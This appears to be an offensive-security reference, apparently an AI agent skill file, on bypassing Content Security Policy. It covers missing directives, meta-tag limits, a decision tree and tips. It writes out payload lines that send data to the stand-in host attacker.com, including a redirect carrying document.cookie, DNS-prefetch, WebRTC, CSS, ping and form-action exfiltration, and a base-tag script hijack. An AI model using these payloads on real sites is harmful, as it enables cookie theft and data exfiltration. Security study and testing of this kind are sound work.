# csp-bypass-advanced — 详细参考（由 SKILL.md 拆分）

### 2.8 Missing `base-uri`

```html
<!-- Inject base tag → all relative URLs resolve to attacker -->
<base href="https://attacker.com/">

<!-- Existing script: <script src="/js/app.js"> -->
<!-- Now loads: https://attacker.com/js/app.js -->
```

This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.

### 2.9 Missing `frame-ancestors`

CSP without `frame-ancestors` → page can be framed → clickjacking possible.

`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely.

---

## 3. CSP IN META TAG vs. HEADER

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**Meta tag limitations:**
- Cannot set `frame-ancestors` (ignored in meta)
- Cannot set `report-uri` / `report-to`
- Cannot set `sandbox`
- If injected via HTML injection *before* the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)
- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)

---

## 4. DATA EXFILTRATION DESPITE CSP

When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:

| Channel | CSP Directive Needed to Block | Technique |
|---|---|---|
| DNS prefetch | None (CSP cannot block DNS) | `<link rel="dns-prefetch" href="//data.attacker.com">` |
| WebRTC | None (CSP cannot block) | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})` |
| `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP |
| Redirect-based | `navigate-to` (rarely set) | `location='https://attacker.com/?'+document.cookie` |
| CSS injection | `style-src` | `<style>body{background:url(https://attacker.com/?data)}</style>` |
| `<a ping>` | `connect-src` | `<a ping="https://attacker.com/collect" href="#">click</a>` |
| `report-uri` leak | N/A | Trigger CSP violation → report contains blocked-uri with data |
| Form submission | `form-action` | `<form action="https://attacker.com/"><button>Submit</button></form>` |

**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.

---

## 5. CSP BYPASS DECISION TREE

```
CSP present?
├── Read full policy (response headers + meta tags)
│
├── Check for obvious weaknesses
│   ├── 'unsafe-inline' in script-src? → Standard XSS works
│   ├── 'unsafe-eval' in script-src? → eval/Function/setTimeout bypass
│   ├── * or data: in script-src? → <script src="data:,alert(1)">
│   └── No CSP header at all on some pages? → Find CSP-free page
│
├── Check missing directives
│   ├── No base-uri? → <base href="https://attacker.com/"> → hijack relative scripts
│   ├── No object-src? → Flash/plugin-based bypass (legacy)
│   ├── No form-action? → Exfil via form submission
│   ├── No frame-ancestors? → Clickjacking possible
│   └── No connect-src falling back to lax default-src? → fetch/XHR exfil
│
├── script-src 'self'?
│   ├── Find JSONP endpoints on same origin
│   ├── Find file upload → upload .js file
│   ├── Find DOM XSS in existing same-origin scripts
│   └── Find Angular/Vue loaded from self → template injection
│
├── script-src with CDN whitelist?
│   ├── Check CDN for JSONP endpoints
│   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
│   └── Check *.cloudfront.net → shared distribution namespace
│
├── script-src 'nonce-xxx'?
│   ├── Nonce reused across requests? → Replay
│   ├── CRLF injection available? → Inject nonce
│   ├── Dangling markup to steal nonce
│   └── Script gadget in trusted scripts
│
├── script-src 'strict-dynamic'?
│   ├── base-uri not set? → <base> hijack
│   ├── DOM XSS in trusted script? → Inherit trust
│   └── Script gadget creating dynamic scripts from DOM data
│
└── All script execution blocked?
    ├── Dangling markup injection → exfil without JS (see ../dangling-markup-injection/SKILL.md)
    ├── DNS prefetch exfiltration
    ├── WebRTC exfiltration
    ├── CSS injection for data extraction
    └── Form action exfiltration
```

---

## 6. TRICK NOTES — WHAT AI MODELS MISS

1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.
